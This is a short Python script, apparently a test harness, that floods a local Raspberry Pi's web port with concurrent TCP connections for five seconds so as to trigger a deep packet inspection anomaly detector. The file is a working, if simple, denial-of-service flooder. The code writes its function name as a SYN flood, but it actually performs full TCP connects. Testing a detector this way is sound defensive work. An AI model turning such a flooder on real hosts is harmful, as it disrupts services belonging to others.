#!/usr/bin/env python3
"""DoS Attack Test - Triggers DPI Detection"""
import socket
import threading
import time

PI_IP = "10.42.0.1"
PI_PORT = 80
THREADS = 50        # Number of concurrent threads
DURATION = 5        # Attack duration in seconds

G = '\033[92m'; R = '\033[91m'; Y = '\033[93m'; C = '\033[96m'; X = '\033[0m'

print(f"""
{C}╔══════════════════════════════════════════╗
║   DoS ATTACK - DPI DETECTION TEST       ║
║   Target: {PI_IP}:{PI_PORT}                    ║
║   Threads: {THREADS}                            ║
║   Duration: {DURATION}s                           ║
╚══════════════════════════════════════════╝{X}
""")

count = 0
lock = threading.Lock()
running = True

def syn_flood():
    global count
    while running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect((PI_IP, PI_PORT))
            s.close()
            with lock:
                count += 1
        except:
            pass

print(f"{Y}Starting {THREADS} threads...{X}")

# Launch threads
threads = []
for i in range(THREADS):
    t = threading.Thread(target=syn_flood, daemon=True)
    t.start()
    threads.append(t)

# Run for DURATION seconds
time.sleep(DURATION)
running = False

for t in threads:
    t.join(timeout=1)

pps = count // DURATION
print(f"\n{G}Sent {count} connections in {DURATION}s ({pps} PPS){X}")
print(f"{C}This should trigger:")
print(f"  - High PPS (>100)  → DPI anomaly")
print(f"  - High SYN ratio   → DPI anomaly")
print(f"  - Port scan pattern → DPI anomaly")
print(f"\nCheck Pi terminal for: 📤 [dpi] anomaly{ X}")